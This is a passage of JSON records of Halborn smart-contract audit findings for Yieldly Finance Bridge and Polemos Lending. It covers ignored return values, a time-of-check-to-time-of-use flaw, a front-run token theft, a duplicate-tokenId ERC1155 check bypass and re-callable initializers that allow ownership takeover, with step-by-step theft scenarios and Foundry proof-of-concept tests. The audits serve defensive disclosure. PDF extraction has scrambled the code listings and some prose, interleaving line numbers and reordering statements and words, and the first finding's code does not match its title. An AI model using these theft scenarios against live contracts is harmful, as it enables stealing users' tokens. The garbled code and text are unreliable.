            "Halborn",
            "Yieldly_Finance_Bridge_Ethereum",
            "Severity: Low"
        ]
    },
    {
        "title": "IGNORE RETURN VALUES",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Yieldly_Finance_Bridge_Ethereum_Smart_Contract_Security_Audit_Halborn_v_1_1.pdf",
        "body": "The return value of an public call is not stored in a local or state variable. In contract VaultMultiSig.sol, there are few instances where public methods are being called and return value(bool) are being ignored. Code Location: VaultMultiSig.sol Line #~88 Listing 21: Dispatcher.sol (Lines ) 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 function proposeAddress ( address _address , uint256 _index ) public onlyOwner { addressProposalStore [ uuid ]. proposal = _address ; addressProposalStore [ uuid ]. proposalType = _index ; addressProposalStore [ uuid ]. timeStamp = block . timestamp ; outstandingAddressProposalsIndex . push ( uuid ); uuid += 1; } function proposeNewOwner ( address _address ) public onlySignatories { addressProposalStore [ uuid ]. proposal = _address ; addressProposalStore [ uuid ]. proposalType = 2; addressProposalStore [ uuid ]. timeStamp = block . timestamp ; outstandingAddressProposalsIndex . push ( uuid ); uuid += 1; } function proposeNewThreshold ( uint256 _threshold ) public onlyOwner { thresholdProposalStore [ uuid ]. proposal = _threshold ; thresholdProposalStore [ uuid ]. timeStamp = block . timestamp ; outstandingThresholdProposalsIndex . push ( uuid ); uuid += 1; } 33 Risk Level: Likelihood - 2 Impact - 2 Recommendation: Add return value check to avoid unexpected crash of the contract. Return value check will help in handling the exceptions better way. Remediation Plan: SOLVED: Yieldly.Finance Team dispatched events on the functions. Listing 22: VaultMultiSig.sol (Lines 94) 88 89 90 91 92 93 94 95 function proposeAddress ( address _address , uint256 _index ) external onlyOwner { addressProposalStore [ uuid ]. proposal = _address ; addressProposalStore [ uuid ]. proposalType = _index ; addressProposalStore [ uuid ]. timeStamp = block . timestamp ; outstandingAddressProposalsIndex . push ( uuid ); uuid += 1; emit ProposeAddress ( _address , _index ); } Listing 23: VaultMultiSig.sol (Lines 103) 97 function proposeNewOwner ( address _address ) external onlySignatories { addressProposalStore [ uuid ]. proposal = _address ; addressProposalStore [ uuid ]. proposalType = 2; addressProposalStore [ uuid ]. timeStamp = block . timestamp ; outstandingAddressProposalsIndex . push ( uuid ); uuid += 1; emit ProposeNewOwner ( _address ); 98 99 100 101 102 103 104 } 34 Listing 24: VaultMultiSig.sol (Lines 111) 106 107 108 109 110 111 112 function proposeNewThreshold ( uint256 _threshold ) external onlyOwner { thresholdProposalStore [ uuid ]. proposal = _threshold ; thresholdProposalStore [ uuid ]. timeStamp = block . timestamp ; outstandingThresholdProposalsIndex . push ( uuid ); uuid += 1; emit ProposeNewThreshold ( _threshold ); } 35 ",
        "labels": [
            "Halborn",
            "Yieldly_Finance_Bridge_Ethereum",
            "Severity: Low"
        ]
    },
    {
        "title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Yieldly_Finance_Bridge_Ethereum_Smart_Contract_Security_Audit_Halborn_v_1_1.pdf",
        "body": "In the public functions, array arguments are immediately copied to mem- ory, while external functions can read directly from calldata. Reading Public functions need to calldata is cheaper than memory allocation. write the arguments to memory because public functions may be called internally. Internal calls are passed internally by pointers to memory. Thus, the function expects its arguments being located in memory when the compiler generates the code for an internal function. Code Location: Vault.sol Line #37 Listing 25: Modifier.sol (Lines 37) 37 function transferFunds ( address _tokenAddress , address _recipient , uint256 _amount ) public onlyDispatcher { 38 39 40 41 42 } require ( tokensStore [ _tokenAddress ]. active == true , \" Token not supported \"); require ( _amount > 0, \" Cannot transfer 0 tokens \"); ERC20 ( _tokenAddress ). transfer ( _recipient , _amount ); emit ReleasedFundsEvent ( _recipient , _amount ); We noticed the use of public functions in the following contracts:  Vault.sol Listing 26: Vault.sol (Lines 37) 37 function getDispatcherAddress () 38 function getMultiSigAddress () 39 function getTokenAddresses () 40 function transferFunds () 36 41 function newMultiSig () 42 function newDispatcher () 43 function addToken () 44 function removeToken ()  Dispatcher.sol Listing 27: Dispatcher.sol (Lines 37) 37 function getBridgeController () 38 function getValidators () 39 function getVaultAddress () 40 function getMultiSig () 41 function getOutstandingTransferProposals () 42 function getValThreshold () 43 function getCreatedTransanction () 44 function getUUID () 45 function newThreshold () 46 function newMultiSig () 47 function newBridgeController () 48 function newVault () 49 function addNewValidator () 50 function proposeNewTxn () 51 function approveTxn () 52 function createTxn ()  VaultMultiSig.sol & DispatcherMultiSig.sol Listing 28: VaultMultiSig.sol - DispatcherMultiSig.sol (Lines 37) 37 function getSignatories () 38 function getProposal () 39 function getThresholdProposal () 40 function getOutstandingAddressProposals () 41 function getOutstandingThresholdProposals () 42 function getThreshold () 43 function proposeAddress () 44 function proposeAddress () 45 function proposeNewOwner () 46 function proposeNewThreshold () 37 47 function approveSignatory () 48 function removeSignatory () 49 function approveNewOwner () 50 function approveNewMultiSig () 51 function approveNewToken () 52 function approveNewDispatcher () 53 function approveNewVault () 54 function approveNewThreshold () Risk Level: Likelihood - 1 Impact - 2 Recommendation: Consider declaring external variables instead of public variables. A best practice is to use external if expecting a function to only be called externally and public if called internally. Public functions are always accessible, but external functions are only available to external callers. Remediation Plan: SOLVED: Yieldly.Finance Team marked functions as an external. 38 3.10 (HAL-10) BLOCK TIMESTAMP USAGE - INFORMATIONAL ",
        "labels": [
            "Halborn",
            "Yieldly_Finance_Bridge_Ethereum",
            "Severity: Informational"
        ]
    },
    {
        "title": "CHECKPOLICY IS VULNERABLE TO TIME",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Polemos_Lending_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The solution implements rental wallets that are under the custody of the Polemos team. Each rental wallet is assigned to each borrower individ- ually. After a successful asset claim, the rented asset is transferred to the rental wallet. Furthermore, the borrower can transfer owned to- kens to the rental wallet. The borrower can manage the rental wallet off-chain, however, the list of possible actions is strictly limited. E.g., the borrower can transfer out any owned tokens from the rental wallet, but transferring the rented asset is forbidden. To check which action is allowed or prohibited, in before any action, the solution calls the checkPolicy() function from the RentalAutomator contract. The checkPolicy() function makes necessary checks, including the rental wal- let tokens balances and rental balances from RentedStats structure, to decide e.g., if a transfer of only owned tokens is allowed, and returns RentalCheckResult and emits RentalPolicyChecked event. Basing on the result and event emitted, the solution can decide about triggering the transfer. However, having in mind the asynchronous nature of the blockchain, the checkPolicy() function can be vulnerable to time-of-check-to-time-of-use Multiple subsequent calls to the checkPolicy() function with issue. operation type set to Transfer_Erc20 may return a success state. Then, the solution-backend triggers multiple transfer transactions, not being aware that the rental wallet balance was changed between transactions. As an example, consider the below scenario: 1. The borrower borrows 50 rental tokens. 2. The borrower transfers another 50 tokens to the rental wallet. 27 3. The borrower triggers an attempt to transfer 50 owned tokens to the external wallet twice, then:  checkPolicy() for the first transfer pass  checkPolicy() for the second transfer pass as well (the total balance is still 100, the claimed balance is 50)  the custodian performs first transfer of 50 tokens  the custodian performs second transfer of 50 tokens As a result, the malicious user used the time-of-check-to-time-of-use vulnerability to steal rented tokens. The vulnerability is related to the rental tokens of type ERC20 and ERC1155. The Polemos team confirmed that this issue is possible without additional backend validation. Code Location: Listing 1: LibRentalPolicyCheck.sol (Lines 256,291) 247 function _checkErc20Transfer ( uint256 totalBalance , 248 uint256 claimedBalance , 249 250 uint256 txBalance 251 252 ) private pure returns ( RentalCheckResult memory ) { // status : the given operation is applied to Claimed or  Reclaimed asset 253 254 if ( claimedBalance > 0) { // allow to \" transfer \" / \" transfer - from when user has  enough own tokens to cover tx - amount 255 // ( this means success when asset is Claimed /  Reclaimed and user has enough non - rented tokens ) 256 257 258 259 260 if ( totalBalance - claimedBalance >= txBalance ) { return RentalCheckResult ( true , PolicyCheckResponseCode .  Checked_When_Erc20_Operation_With_Own_Tokens ); 261 262 263 264 } else { return RentalCheckResult ( 28 265 266 false , PolicyCheckResponseCode .  Not_Checked_When_Erc20_Operation 267 268 269 270 ); } } else { // Allow to \" transfer \" / \" transfer - from \" for Staked or  Unstaked asset 271 272 // or for unknown asset for Automator . // ( this means success when user tries to transfer own  tokens , tokens he is approved to spend , // or tokens not intersting for Automator ) return RentalCheckResult ( true , PolicyCheckResponseCode .  Checked_When_Erc20_Operation_With_Own_Tokens 278 279 280 281 282 283 284 285 286 287 ); } } function _checkErc1155Transfer ( uint256 totalBalance , uint256 claimedBalance , uint256 txBalance ) private pure returns ( RentalCheckResult memory ) { // status : the given operation is applied to Claimed or  Reclaimed asset 288 289 if ( claimedBalance > 0) { // allow to \" safeBatchTransferFrom \" / \"  safeTransferFrom \" when user has enough own tokens to cover tx -  amount 290 // ( this means success when asset is Claimed /  Reclaimed and user has enough non - rented tokens ) 291 292 293 294 295 if ( totalBalance - claimedBalance >= txBalance ) { return RentalCheckResult ( true , PolicyCheckResponseCode .  Checked_When_Erc1155_Operation_With_Own_Tokens ); 273 274 275 276 277 296 297 298 299 } else { return RentalCheckResult ( 29 300 301 false , PolicyCheckResponseCode .  Not_Checked_When_Erc1155_Operation 302 303 304 305 ); } } else { // Allow to \" safe - batch - transfer - from \" / \" safe -  transfer - from \" for Staked or Unstaked asset 306 307 // or for unknown asset for Automator . // ( this means success when user tries to transfer own  tokens , tokens he is approved to spend , 308 309 310 311 312 // or tokens not intersting for Automator ) return RentalCheckResult ( true , PolicyCheckResponseCode .  Checked_When_Erc1155_Operation_With_Own_Tokens 313 314 315 } } ); Risk Level: Likelihood - 5 Impact - 5 Recommendation: It is recommended to ensure that the backend custodian service is trig- gering transactions for rental wallet synchronously, e.g., by queuing. Alternatively, it is recommended to combine both the check policy busi- ness logic with the transfer operation for rental wallet into a single smart contract function, thus, making it atomic. Remediation Plan: SOLVED: The Polemos team solved this issue in commit 4bbbcb7941556e7486b691cb58b811733a02d2d1: the checkPolicy() function is now disabled for all operation types related to transfer of ERC20, ERC721 30 or ERC1155 tokens. Instead, a new transferFromRentalWallet() function is introduced, that handles both checkPolicy() functionality and transfer of tokens in a single transaction. 31 ",
        "labels": [
            "Halborn",
            "Polemos_Lending",
            "Severity: Critical"
        ]
    },
    {
        "title": "CLAIMASSET CAN BE FRONT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Polemos_Lending_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The solution implements rental wallets that are under the custody of the Polemos team. Each rental wallet is assigned to each borrower individu- ally. After a successful asset claim, the rented asset is transferred to the rental wallet. Furthermore, the borrower can transfer owned tokens The borrower can manage the rental wallet off- to the rental wallet. chain, however, the list of possible actions is strictly limited. E.g., the borrower can transfer out any owned tokens from the rental wallet, but transferring the rented asset is forbidden. To check which action is allowed or prohibited, in before any action, the solution calls the checkPolicy() function from RentalAutomator. The checkPolicy() function makes necessary checks, including the rental wallet tokens balances and rental balances from RentedStats structure, to decide e.g., if a transfer of only owned tokens is allowed, and returns RentalCheckResult and emits RentalPolicyChecked event. Basing on the result and event emitted, the solution can decide about triggering the transfer. The _checkErc20Transfer() function determines if the transfer of owned tokens is allowed. However, if there are no rental tokens in the rental wallet (the claimedBalance parameter is zero) then the solution allows transferring any amount of owned tokens, without checking the actual balance. Thus, it is possible to trigger transfer of tokens, which are currently not in possession. Eventually, a malicious user can trigger both claimAsset() and checkPolicy() for token transfer simultaneously. Assuming that claimAsset() executes after the checkPolicy() it transfers Then, subsequent transfer of tokens the rental tokens to the wallet. triggered by the backend will transfer rental tokens out from the wallet, as it was previously approved via the checkPolicy(). 32 As an example, consider the below scenario: 1. The borrower registers a new rental wallet. 2. The lender stakes an amount of ERC20 token, e.g., XYZ token. 3. The borrower triggers in solution-backend the token transfer from rental wallet for amount of XYZ tokens from step 2. 4. Simultaneously, the borrower calls claimAsset() for the lenders XYZ tokens from step 2 immediately. 5. The checkPolicy() call initiated within step 3 returns a positive result. 6. The claimAsset() call finishes and transfers rental tokens to the borrowers rental wallet. 7. The solution-backend receives the result of the checkPolicy() call from step 5 and proceeds with token transfer received in step 6. As a result, the malicious user used the front-run vulnerability to steal rented tokens. The vulnerability is related to the rental tokens of type ERC20 and ERC1155. Code Location: Listing 278,288,304,309-313) 2: LibRentalPolicyCheck.sol (Lines 253,269,274- 247 function _checkErc20Transfer ( uint256 totalBalance , 248 uint256 claimedBalance , 249 uint256 txBalance 250 251 252 ) private pure returns ( RentalCheckResult memory ) { // status : the given operation is applied to Claimed or  Reclaimed asset 253 254 if ( claimedBalance > 0) { // allow to \" transfer \" / \" transfer - from when user has  enough own tokens to cover tx - amount 255 // ( this means success when asset is Claimed /  Reclaimed and user has enough non - rented tokens ) 256 257 258 259 if ( totalBalance - claimedBalance >= txBalance ) { return RentalCheckResult ( true , 33 260 PolicyCheckResponseCode .  Checked_When_Erc20_Operation_With_Own_Tokens ); } else { return RentalCheckResult ( false , PolicyCheckResponseCode .  Not_Checked_When_Erc20_Operation 267 268 269 270 ); } } else { // Allow to \" transfer \" / \" transfer - from \" for Staked or  Unstaked asset 271 272 // or for unknown asset for Automator . // ( this means success when user tries to transfer own  tokens , tokens he is approved to spend , // or tokens not intersting for Automator ) return RentalCheckResult ( true , PolicyCheckResponseCode .  Checked_When_Erc20_Operation_With_Own_Tokens 261 262 263 264 265 266 273 274 275 276 277 278 279 280 281 282 283 284 285 286 287 ); } } function _checkErc1155Transfer ( uint256 totalBalance , uint256 claimedBalance , uint256 txBalance ) private pure returns ( RentalCheckResult memory ) { // status : the given operation is applied to Claimed or  Reclaimed asset 288 289 if ( claimedBalance > 0) { // allow to \" safeBatchTransferFrom \" / \"  safeTransferFrom \" when user has enough own tokens to cover tx -  amount 290 // ( this means success when asset is Claimed /  Reclaimed and user has enough non - rented tokens ) 291 292 293 294 if ( totalBalance - claimedBalance >= txBalance ) { return RentalCheckResult ( true , 34 295 PolicyCheckResponseCode .  Checked_When_Erc1155_Operation_With_Own_Tokens ); } else { return RentalCheckResult ( false , PolicyCheckResponseCode . 296 297 298 299 300 301  Not_Checked_When_Erc1155_Operation 302 303 304 305 ); } } else { // Allow to \" safe - batch - transfer - from \" / \" safe -  transfer - from \" for Staked or Unstaked asset 306 307 // or for unknown asset for Automator . // ( this means success when user tries to transfer own  tokens , tokens he is approved to spend , 308 309 310 311 312 // or tokens not intersting for Automator ) return RentalCheckResult ( true , PolicyCheckResponseCode .  Checked_When_Erc1155_Operation_With_Own_Tokens 313 314 315 } } ); Proof of Concept: The below unit test confirms the possibility of triggering checkPolicy() for any amount of tokens while not having claimed tokens positive balance. Listing 3: HalbornERC20CheckPolicyTest.t.sol function 1  test_checkPolicy_for_transfer_ERC20_with_empty_balance () public { 2 3 4 5 6  RentalPolicyArguments ( uint256 [] memory Ids = new uint256 [](1) ; uint256 [] memory ammounts = new uint256 [](1) ; Ids [0] = 0; ammounts [0] = 10 e10 ; RentalPolicyArguments memory rentalPolicyArguments = 35 address ( mockErc20Token ) , Ids , borrower1 , borrowerExternal1 , ammounts , address (0) , true , address (0) , OperationType . Transfer_Erc20 7 8 9 10 11 12 13 14 15 16 17 18 ( RentalCheckResult memory rentalCheckResult ) =  rentalAutomator . checkPolicy ( rentalPolicyArguments , AssetType . EIP20  ); 19 20  PolicyCheckResponseCode .  Checked_When_Erc20_Operation_With_Own_Tokens )) ; 21 assertEq ( rentalCheckResult . success , true ); assertEq ( uint ( rentalCheckResult . resultCode ) , uint ( ); } Risk Level: Likelihood - 5 36 Impact - 5 Recommendation: It is recommended to verify the amount and balance of the triggered tokens transfer by the borrower within the checkPolicy() function when no rental tokens are present in the rental wallet. Remediation Plan: SOLVED: The Polemos team solved this issue in commit 4bbbcb7941556e7486b691cb58b811733a02d2d1: the _checkErc20Transfer() and the _checkErc1155Transfer() functions are now checking the rental wallet balances in every case. Furthermore, the checkPolicy() function is now disabled for all operation types related to transfer of ERC20, ERC721 or ERC1155 tokens. Instead, a new transferFromRentalWallet() function is introduced, that handles both checkPolicy() functionality and transfer of tokens in a single transaction. 37 ",
        "labels": [
            "Halborn",
            "Polemos_Lending",
            "Severity: Critical"
        ]
    },
    {
        "title": "CHECKPOLICY BYPASS FOR SAFEBATCHTRANSFERFROM ERC1155 IS POSSIBLE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Polemos_Lending_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The solution implements rental wallets that are under the custody of the Polemos team. Each rental wallet is assigned to each borrower individ- ually. After a successful asset claim, the rented asset is transferred to the rental wallet. Furthermore, the borrower can transfer owned to- The borrower can manage the rental wallet kens to the rental wallet. off-chain, however, the list of possible actions is strictly limited. E.g., the borrower can transfer out any owned tokens from the rental wallet, but transferring the rented asset is forbidden. To check which action is allowed or prohibited, in before any action, the solution calls the checkPolicy() function from RentalAutomator. The checkPolicy() makes necessary checks, including the rental wallet tokens balances and rental balances from RentedStats structure, to decide e.g., if a transfer of only owned tokens is allowed, and returns RentalCheckResult and emits RentalPolicyChecked event. Basing on the result and event emitted, the solution can decide about triggering the transfer. The _applyErc1155Rules() and _checkErc1155Transfer() functions determine if the batch transfer of owned tokens is allowed. The batch transfer, defined as SafeBatchTransferFrom_Erc1155 operation type, allows transfer- ring multiple ERC1155 tokens with provided amounts at once. However, as the _checkErc1155Transfer() function checks the rental wallets balances, the _applyErc1155Rules() function does not check if RentalPolicyArguments .tokenIds contains distinct values. Therefore, it is possible to provide one tokenId multiple times with the amount set up-to owned tokens balance. Furthermore, the OpenZeppelins implementation of safeBatchTransferFrom () does not check user input against distinct values. Ultimately, this vulnerability can be abused to bypass the checkPolicy() restrictions and trigger the batch transfer that includes all rental tokens. 38 As an example, consider the below scenario: 1. The borrower register new rental wallet. 2. The lender stakes an amount of ERC1155 token, e.g., 10 tokens of tokenId=1. 3. The borrower borrows ERC1155 tokens. 4. The borrower transfers owned tokens to the rental wallet with the same tokenId=1 and amount=10. Note that the rental wallet has now total balance equal to 20. 5. The borrower triggers in solution-backend the batch token trans- fer from rental wallet for tokenId=1. The RentalPolicyArguments. tokenIds is set to [1, 1] and RentalPolicyArguments.amounts is set to [10, 10]. Note that tokenIds contains duplicate ids. 6. Observe that the checkPolicy() transactions finishes successfully. 7. The solution-backend triggers safeBatchTransferFrom() for 20 tokens in total. As a result, the malicious user abused the weakness in ERC1155 token validation to transfer out rental tokens from the rental wallet. Code Location: Listing 4: LibRentalPolicyCheck.sol (Lines 195-200) 165 function _applyErc1155Rules ( 166 167 168 169 170 171 172 OperationType erc1155Operation , uint256 [] memory rentalWalletTotalBalances , uint256 [] memory rentalWalletClaimedBalances , RentalPolicyArguments memory args , address automatorAddress ) private pure returns ( RentalCheckResult memory ) { // method \" set - approval - for - all \" is prohibited , unless  operator is the Automator 173 if ( erc1155Operation == OperationType .  SetApprovalForAll_Erc1155 ) { 174 if ( args . operatorOrSpender == automatorAddress && args  . approved ) { 175 176 return RentalCheckResult ( true ,  PolicyCheckResponseCode . Checked_When_Erc1155_Operation ); 39 177 178 179 180 181 } return RentalCheckResult ( false , PolicyCheckResponseCode .  Not_Checked_When_Erc1155_Operation 182 183 184 185 ); } // this is required to return the most accurate result in  case of safe - transfer operation 186 if ( erc1155Operation == OperationType .  SafeTransferFrom_Erc1155 ) { 187 188 189 190 191 192 193 194 195 196  ( 197 198 199 200 201 202 return _checkErc1155Transfer ( rentalWalletTotalBalances [0] , rentalWalletClaimedBalances [0] , args . amounts [0] ); } for ( uint256 i = 0; i < args . tokenIds . length ; i ++) { RentalCheckResult memory check = _checkErc1155Transfer rentalWalletTotalBalances [ i ], rentalWalletClaimedBalances [i ], args . amounts [ i] ); // if there is not_checked result , then we should  break the cycle and return with suitable result 203 if ( check . resultCode == PolicyCheckResponseCode .  Not_Checked_When_Erc1155_Operation ) { 204 205 206 207 return RentalCheckResult ( false , PolicyCheckResponseCode .  Not_Checked_When_Erc1155_Operation 208 209 210 211 212 213 ); } } return RentalCheckResult ( true , 40 214 PolicyCheckResponseCode .  Checked_When_Erc1155_Operation_With_Own_Tokens 215 216 } ); Listing 5: LibRentalPolicyCheck.sol (Line 291) 282 function _checkErc1155Transfer ( 283 284 285 286 287 uint256 totalBalance , uint256 claimedBalance , uint256 txBalance ) private pure returns ( RentalCheckResult memory ) { // status : the given operation is applied to Claimed or  Reclaimed asset 288 289 if ( claimedBalance > 0) { // allow to \" safeBatchTransferFrom \" / \"  safeTransferFrom \" when user has enough own tokens to cover tx -  amount 290 // ( this means success when asset is Claimed /  Reclaimed and user has enough non - rented tokens ) 291 292 293 294 295 if ( totalBalance - claimedBalance >= txBalance ) { return RentalCheckResult ( true , PolicyCheckResponseCode .  Checked_When_Erc1155_Operation_With_Own_Tokens ); 296 297 298 299 300 301 } else { return RentalCheckResult ( false , PolicyCheckResponseCode .  Not_Checked_When_Erc1155_Operation 302 303 304 305 ); } } else { // Allow to \" safe - batch - transfer - from \" / \" safe -  transfer - from \" for Staked or Unstaked asset 306 307 // or for unknown asset for Automator . // ( this means success when user tries to transfer own  tokens , tokens he is approved to spend , 308 309 310 // or tokens not intersting for Automator ) return RentalCheckResult ( 41 311 312 true , PolicyCheckResponseCode .  Checked_When_Erc1155_Operation_With_Own_Tokens 313 314 315 } } ); Proof of Concept: unit test below confirms The the the checkPolicy() with duplicate entries in the RentalPolicyArguments. Furthermore, the same possibility is proven for tokenIds collection. safeBatchTransferFrom(). possibility triggering of Listing 6: HalbornERC1155CheckPolicyTest.t.sol claimAssetFromLenderToBorrowerERC1155 () ; // mint 10 tokens to borrower1 , so he has 20; 10 owned mockErc1155Token . mint ( borrower1 , 1, 10) ; uint256 [] memory Ids = new uint256 [](2) ; uint256 [] memory ammounts = new uint256 [](2) ; Ids [0] = 1; ammounts [0] = 10; Ids [1] = 1; ammounts [1] = 10; RentalPolicyArguments memory rentalPolicyArguments = 1 function  test_checkPolicy_ERC1155_SafeBatchTransferFrom_with_same_tokenId ()  public { 2 3 4 5 6 7 8 9 10 11 12 13  RentalPolicyArguments ( 14 15 16 17 18 19 20 21 22 23 address ( mockErc1155Token ) , Ids , borrower1 , borrowerExternal1 , ammounts , address ( rentalAutomator ) , true , address (0) , OperationType . SafeBatchTransferFrom_Erc1155 ); 42 vm . prank ( borrower1 ); ( RentalCheckResult memory rentalCheckResult ) = assertEq ( rentalCheckResult . success , true ); assertEq ( uint ( rentalCheckResult . resultCode ) , uint ( 24 25 26  rentalAutomator . checkPolicy ( rentalPolicyArguments , AssetType .  EIP1155 ); 27 28  PolicyCheckResponseCode .  Checked_When_Erc1155_Operation_With_Own_Tokens )); 29 30 31  0) ; 32 33 34  borrowerExternal1 , Ids , ammounts , data ); 35 36  20) ; } 37 bytes memory data ; vm . prank ( borrower1 ); mockErc1155Token . safeBatchTransferFrom ( borrower1 , assertEq ( mockErc1155Token . balanceOf ( borrower1 , 1) , 0) ; assertEq ( mockErc1155Token . balanceOf ( borrowerExternal1 , 1) , assertEq ( mockErc1155Token . balanceOf ( borrower1 , 1) , 20) ; assertEq ( mockErc1155Token . balanceOf ( borrowerExternal1 , 1) , Risk Level: Likelihood - 5 Impact - 5 43 Recommendation: It is recommended to verify whether the RentalPolicyArguments.tokenIds collection contains only distinct ids for SafeBatchTransferFrom_Erc1155 operation type within the checkPolicy() function. Remediation Plan: SOLVED: The Polemos team solved this issue in commit the validateTokensIdsList() 4bbbcb7941556e7486b691cb58b811733a02d2d1: function call is now introduced in the body of the _preparePolicyCheckData () function. The validation verifies whether tokenIds are unique. 44 ",
        "labels": [
            "Halborn",
            "Polemos_Lending",
            "Severity: Critical"
        ]
    },
    {
        "title": "DIAMOND PROXY INITIALIZE FUNCTIONS CAN BE CALLED MULTIPLE TIMES",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Polemos_Lending_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "as is revealed proxy proxy diamond the solution solution implements assumes The upgradeability pattern. firstly that The then initialize functions are called from each facet. the assessment that and multiple initalizeAuthenticatedUpgradabilityModule() times. Both functions can be abused to take the contracts ownership. In contrary, initializeRentalAutomator() from the RentalAutomatorFacet can be called only once, as it turns on the isInitialized property within the _initEip712Config(). However, initializeRentalAdminFacet() be deployed, called can the Code Location: Listing 7: RentalAuthenticatedUpgradabilityFacet.sol storage facetStorage = getAuthentificationFacetStorage function initalizeAuthenticatedUpgradabilityModule ( address [] DiamondStorage storage ds = state () ; RentalAuthenticatedUpgradabilityFacetStorage 69  calldata adminUserList ) external { 70 71 72 73  () ; 74 require (! facetStorage . isInitialized ,  AUTHENTICATED_UPGRADABILITY_FACET_ALREADY_INITIALIZED ); 75  INVALID_ADMIN_LIST_LENGTH_ERR ); 76  DUPLICATED_ADMIN_USERS_ERR ); 77 78 79 80 81 address currentAdmin = adminUserList [ i ]; ds . adminList . _isAdmin [ currentAdmin ] = true ; ds . adminList . addresses . push ( currentAdmin ); for ( uint8 i ; i < MAX_ADMINS_COUNT ; ++ i) { require ( adminUserList . length == MAX_ADMINS_COUNT , _validateListContainsUniqueItemsWithErr ( adminUserList , 45 82 83 } } Listing 8: RentalAdminFacet.sol function initializeRentalAdminFacet () external { RentalAdminFacetStorage storage facetStorage = require (! facetStorage . isInitialized , 68 69  getAdminFacetStorage () ; 70  ADMIN_FACET_ALREADY_INITIALIZED ); 71 72 73 74 } DiamondStorage storage ds = state () ; ds . adminAddress = msg . sender ; Listing 9: RentalAutomatorFacet.sol (Line 62) LibRentalParamValidator . validateAddressNotNullWithError ( ); validateContractSupportsErc20Interface ( DiamondStorage storage ds = state () ; address _feeTokenContractAddress , string memory _eip721DomainName ) external { _feeTokenContractAddress , USDC_ADDRESS_IS_NILL_ERR 40 function initializeRentalAutomator ( 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56  _feeTokenContractAddress ); 57 58 59 60 61  is appended and inited 62  address ( this ))); publicUtils () , _feeTokenContractAddress , address ( this ) ); ds . feeTokenContractInstance = IERC20 ( ds . defaultReclaimPeriod = DEFAULT_RECLAIM_PERIOD ; ds . minRentalPeriod = MIN_RENTAL_PERIOD ; ds . maxRentalPeriod = MAX_RENTAL_PERIOD ; // note : make sure this is invoked after recoverable facet _initEip712Config ( _eip721DomainName , IBaseRecoverable ( 46 63 } Listing 10: Eip712ConfigFacet.sol (Line 33) function _initEip712Config ( string memory _domainName , Eip712ConfigFacetStorage storage facetStorage = require (! facetStorage . isInitialized , DiamondStorage storage ds = state () ; ds . domainName = _domainName ; 20  IBaseRecoverable recoverable ) internal { 21  getEip712FacetStorage () ; 22  EIP712_CONFIG_FACET_ALREADY_INITIALIZED ); 23 24 25 26 27  buildDomainSeparator ( 28 29 30 31 32 33 34 _domainName , VERSION , address ( this ) facetStorage . isInitialized = true ; ); } ds . cachedDomainSeparator = recoverable . Proof of Concept: unit tests below confirm The the initializeRentalAdminFacet() and initalizeAuthenticatedUpgradabilityModule () functions multiple times, whereas initializeRentalAutomator can be called only once. possibility triggering the of Listing 11: HalbornDiamondProxyTests.t.sol 1 2 3 4 5 6 7 8 function setUp () public { (...) rentalDiamondLoupeFacet = new RentalDiamondLoupeFacet () ; rentalAdminFacet = new RentalAdminFacet () ; rentalRecoverableFacet = new RentalRecoverableFacet () ; publicUtilsFacet = new PublicUtilsFacet () ; rentalAutomatorFacet = new RentalAutomatorFacet () ; 47 rentalPolicyHandlerFacet = new RentalPolicyHandlerFacet () ; rentalAutomatorFacet = new RentalAutomatorFacet () ; rentalAssetHandlerFacet = new RentalAssetHandlerFacet () ; rentalAuthenticatedUpgradabilityFacet = new address ( rentalDiamondLoupeFacet ) , FacetCutAction . Add , generateSelectors (\" RentalDiamondLoupeFacet \") FacetCutWithoutInitData [] memory cut = new cut [0] = FacetCutWithoutInitData ( address ( rentalAdminFacet ) , FacetCutAction . Add , generateSelectors (\" RentalAdminFacet \" ) ); cut [2] = FacetCutWithoutInitData ( ); cut [1] = FacetCutWithoutInitData ( 9 10 11 12  RentalAuthenticatedUpgradabilityFacet () ; 13 14  FacetCutWithoutInitData [](8) ; 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 ); cut [4] = FacetCutWithoutInitData ( ); cut [6] = FacetCutWithoutInitData ( ); cut [5] = FacetCutWithoutInitData ( ); address ( rentalRecoverableFacet ) , FacetCutAction . Add , generateSelectors (\" RentalRecoverableFacet \" ) ); cut [3] = FacetCutWithoutInitData ( address ( publicUtilsFacet ) , FacetCutAction . Add , generateSelectors (\" PublicUtilsFacet \" ) address ( rentalPolicyHandlerFacet ) , FacetCutAction . Add , generateSelectors (\" RentalPolicyHandlerFacet \" ) address ( rentalAssetHandlerFacet ) , FacetCutAction . Add , generateSelectors (\" RentalAssetHandlerFacet \") address ( rentalAutomatorFacet ) , FacetCutAction . Add , generateSelectors (\" RentalAutomatorFacet \") 48 ); cut [7] = FacetCutWithoutInitData ( address [] memory temp = new address [](3) ; RentalAutomatorFacet ( address ( rentalAutomatorProxy )) . rentalAutomatorProxy = new RentalAutomatorProxy ( cut ); temp [0] = address ( owner ); temp [1] = address ( owner2 ); temp [2] = address ( owner3 ); address ( rentalAuthenticatedUpgradabilityFacet ) , FacetCutAction . Add , generateSelectors (\" 51 52 53 54  RentalAuthenticatedUpgradabilityFacet \") 55 56 57 58 59  initializeRentalAutomator ( address ( mockUSDToken ) , domainName ); 60 61 62 63 64 65 66 RentalAuthenticatedUpgradabilityFacet ( address ( 67  rentalAutomatorProxy )) . initalizeAuthenticatedUpgradabilityModule (  temp ); 68 69  initializeRentalAdminFacet () ; 70 71 72 73  public { 74 75 76  